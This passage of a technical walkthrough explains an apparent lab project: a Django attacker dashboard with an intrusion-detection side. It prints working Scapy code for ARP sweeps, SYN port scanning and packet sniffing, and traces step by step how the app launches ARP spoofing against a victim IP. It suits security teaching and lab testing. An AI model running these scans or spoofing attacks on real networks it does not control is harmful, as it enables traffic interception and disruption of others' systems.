        Scan network
        
        network_range: "192.168.189.0/24"
        full_scan: True = also do port scanning
        """
        
        hosts = []
        
        # Step 1: ARP Ping Sweep (fast)
        hosts = self.arp_scan(network_range)
        
        # Step 2: Port Scanning (optional, slow)
        if full_scan:
            for host in hosts:
                open_ports = self.scan_ports(host.ip)
                host.open_ports = open_ports
                # Also try reverse DNS
                try:
                    host.hostname = socket.gethostbyaddr(host.ip)[0]
                except:
                    host.hostname = 'Unknown'
        
        return hosts
    
    def arp_scan(self, network_range):
        """ARP ping sweep"""
        hosts = []
        
        # Create ARP request
        arp = ARP(pdst=network_range)
        ether = Ether(dst='ff:ff:ff:ff:ff:ff')
        pkt = ether / arp
        
        # Send and receive
        result = srp(pkt, timeout=2, verbose=False)
        
        # Parse responses
        for sent, received in result[0]:
            ip = received.psrc
            mac = received.hwsrc
            
            host = Host(ip=ip, mac=mac)
            hosts.append(host)
        
        return hosts
    
    def scan_ports(self, ip, ports=[22, 80, 443, 3306]):
        """TCP port scanning"""
        open_ports = []
        
        for port in ports:
            try:
                ip_pkt = IP(dst=ip)
                tcp_pkt = TCP(dport=port, flags='S')
                result = sr1(ip_pkt / tcp_pkt, timeout=1, verbose=False)
                
                if result and result.haslayer(TCP):
                    if result[TCP].flags == 0x12:  # SYN-ACK
                        open_ports.append(port)
                        
            except:
                pass
        
        return open_ports
```

**How it works:**

1. **ARP Scan:**
   - Send ARP "Who has X.X.X.X?" to entire network
   - Devices that exist reply
   - Extract IP and MAC from responses

2. **Port Scan (optional):**
   - For each discovered IP
   - Send TCP SYN to ports 22, 80, 443, 3306
   - If SYN-ACK received: port is open

---

### Traffic Sniffer (modules/traffic_sniffer.py)

```python
from scapy.all import sniff, IP, TCP, UDP, ICMP, DNS, ARP

class TrafficSniffer:
    """Captures and analyzes network packets"""
    
    def __init__(self, filter=None, max_packets=0):
        self.filter = filter          # BPF filter (e.g., "tcp port 80")
        self.max_packets = max_packets
        self.packets = []
        self.running = False
        self.stats = {}
    
    def start(self):
        """Start capturing packets"""
        self.running = True
        
        # Start sniffing in background
        sniff(
            iface=None,           # All interfaces
            prn=self.packet_callback,  # Call this for each packet
            filter=self.filter,
            store=False,
            stop_filter=lambda x: not self.running
        )
    
    def packet_callback(self, packet):
        """Called for each captured packet"""
        
        # Extract info
        info = {
            'timestamp': time.time(),
            'protocol': 'Unknown',
            'src': 'Unknown',
            'dst': 'Unknown',
            'src_port': None,
            'dst_port': None,
            'info': ''
        }
        
        # Analyze packet layers
        if IP in packet:
            info['src'] = packet[IP].src
            info['dst'] = packet[IP].dst
            
            if TCP in packet:
                info['protocol'] = 'TCP'
                info['src_port'] = packet[TCP].sport
                info['dst_port'] = packet[TCP].dport
                flags = packet[TCP].flags
                info['info'] = f"Flags: {flags}"
                
            elif UDP in packet:
                info['protocol'] = 'UDP'
                info['src_port'] = packet[UDP].sport
                info['dst_port'] = packet[UDP].dport
                
                # Check if DNS
                if DNS in packet:
                    info['protocol'] = 'DNS'
                    
            elif ICMP in packet:
                info['protocol'] = 'ICMP'
                info['info'] = 'Ping'
        
        elif ARP in packet:
            info['protocol'] = 'ARP'
            info['src'] = packet[ARP].psrc
            info['dst'] = packet[ARP].pdst
            info['info'] = 'Who has' if packet[ARP].op == 1 else 'Is at'
        
        # Store packet
        self.packets.append(info)
        
        # Update stats
        protocol = info['protocol']
        self.stats[protocol] = self.stats.get(protocol, 0) + 1
    
    def get_packets(self, limit=50):
        """Return last N packets"""
        return self.packets[-limit:]
    
    def get_statistics(self):
        """Return packet statistics"""
        return {
            'total_packets': len(self.packets),
            'protocol_stats': self.stats
        }
    
    def stop_sniffing(self):
        """Stop capturing"""
        self.running = False
```

---

## Complete Request Flow

### Example: User Launches ARP Attack

```
1. USER ACTION
   └─> Opens browser, goes to http://192.168.189.10:8000/login
       └─> Django routes to login_view()
           └─> Returns login.html form

2. USER LOGS IN
   └─> Enters username: "attacker", password: "attack123"
       └─> Form POSTs to /login/
           └─> Django calls login_view(POST)
               └─> authenticate(username, password) checks database
                   └─> Django.auth looks up user in User table
                       └─> Finds user, checks password hash
                           └─> Match! Sets session cookie
                               └─> Redirects to /attacker/

3. ATTACKER DASHBOARD LOADS
   └─> Browser gets /attacker/
       └─> Django calls attacker_dashboard(request)
           └─> Checks @login_required → cookie valid
               └─> Checks is_attacker() → role is ATTACKER
                   └─> Gets local_ip = "192.168.189.10"
                       └─> Gets gateway_ip = "192.168.189.2"
                           └─> Renders attacker.html with context
                               └─> HTML template shows form

4. USER FILLS ARP FORM
   └─> Victim IP: 192.168.189.20
       └─> Gateway IP: 192.168.189.2
           └─> Clicks "Start" button
               └─> JavaScript: startARPAttack() called

5. JAVASCRIPT SENDS REQUEST
   └─> fetch('/api/attack/arp/start/', {
           method: 'POST',
           headers: {
               'Content-Type': 'application/json',
               'X-CSRFToken': 'token_from_cookie'
           },
           body: JSON.stringify({
               target_ip: '192.168.189.20',
               gateway_ip: '192.168.189.2',
               interface: '',
               interval: 2
           })
       })

6. DJANGO RECEIVES API REQUEST
   └─> URL router sees /api/attack/arp/start/
       └─> Calls start_arp_attack(request)
           └─> @login_required → checks session
               └─> is_attacker() → checks role
                   └─> Gets parameters from request.data
                       └─> Validates inputs
                           └─> Creates ARPSpoofer(victim_ip, gateway_ip)
                               └─> Starts thread: spoofer.start(interval=2)
                                   └─> Thread loops: sends ARP packets every 2 sec
                                       └─> Packets go to network
                                           └─> Victim receives them
                                               └─> Updates ARP table
                                                   └─> victim's 192.168.189.2 → attacker's MAC
                                                       └─> All traffic routes through attacker

7. DJANGO RESPONDS
   └─> Returns JSON:
       {
           "status": "started",
           "attack_id": "arp_192.168.189.20_192.168.189.2",
           "message": "ARP spoofing attack started..."
       }

8. JAVASCRIPT UPDATES UI
   └─> Disables "Start" button
       └─> Enables "Stop" button
           └─> Shows "✅ Attack Started" message
               └─> Calls refreshAttackStats() every 2 seconds

9. REFRESH STATS
   └─> fetch('/api/attack/stats/')
       └─> Django returns {attacks: {...}}
           └─> JavaScript builds HTML table
               └─> Displays: Type | Target | Packets | Status
                   └─> Updates every 2 seconds (shows packet count climbing)

10. USER CLICKS STOP
    └─> stopARPAttack() called
        └─> fetch('/api/attack/arp/stop/', {attack_id: ...})
            └─> Django calls stop_arp_attack()
                └─> Gets spoofer object from memory
                    └─> Calls spoofer.stop()
                        └─> Sets running = False (loop exits)
                            └─> Sends corrective ARP packets
                                └─> Victim's ARP table restored
                                    └─> Traffic goes back to real gateway
                                        └─> Logs end_time to AttackLog table

11. UI UPDATES
    └─> Enables "Start" button
        └─> Disables "Stop" button
            └─> Shows "✅ Attack Stopped" message
```

---

## Data Models Summary

### User
```
username: "attacker"
email: "attacker@ids.local"
password_hash: (hashed with SHA256)
role: "ATTACKER"
machine_type: "kali"
first_name: "Red"
last_name: "Team"
```

### AttackLog
```
user: (FK to User)
attack_type: "ARP_SPOOFING"
target_ip: "192.168.189.20"
gateway_ip: "192.168.189.2"
target_port: NULL (for ARP)
packets_sent: 1500
status: "stopped"
start_time: 2025-12-11 21:30:00
end_time: 2025-12-11 21:35:00
notes: "Test attack"
```

### DetectionLog
```
alert_type: "ARP_SPOOF"
severity: "HIGH"
source_ip: "192.168.189.10"
target_ip: "192.168.189.20"
detected_at: 2025-12-11 21:30:01
details: {"reason": "ARP cache poisoning detected", "count": 15}
is_blocked: False
blocked_at: NULL
```

---

## File-by-File Breakdown

| File | Purpose | Key Code |
|------|---------|----------|
| **settings.py** | Django config | DATABASES, INSTALLED_APPS, ALLOWED_HOSTS |
| **urls.py** | URL routing | path('login/', views.login_view) |
| **models.py** | Database schema | class User, AttackLog, DetectionLog |
| **views.py** | API endpoints | @api_view, get_attack_stats, start_arp_attack |
| **attacker.html** | Frontend UI | Tabs, forms, buttons, status display |
| **arp_spoof.py** | ARP attack | ARPSpoofer.start(), send ARP packets |
| **syn_flood.py** | SYN attack | SYNFlooder.send_packets(), raw sockets |
| **network_scanner.py** | Network scan | arp_scan(), scan_ports() |
| **traffic_sniffer.py** | Packet capture | sniff(), packet_callback() |
| **logger.py** | Logging | write_log(), log_attack() |
| **network_utils.py** | Helpers | get_local_ip(), get_gateway_ip() |

---

## Key Concepts

### 1. Django MVT Pattern
```
Model → View → Template
Database → Business Logic → HTML
```

### 2. REST API
```
Client (Browser)  ←→  Server (Django)
     JSON              JSON
```

### 3. Threading
```
Main thread (handle requests)
Background thread 1 (ARP spoof loop)
Background thread 2 (SYN flood loop)
Background thread 3 (Network scan)
```

### 4. Packet Sending
```
Python → Scapy library → Raw sockets → Network card → Network
```

---

**That's everything! Start with Dashboard → API → Attack Module logic.** 🚀
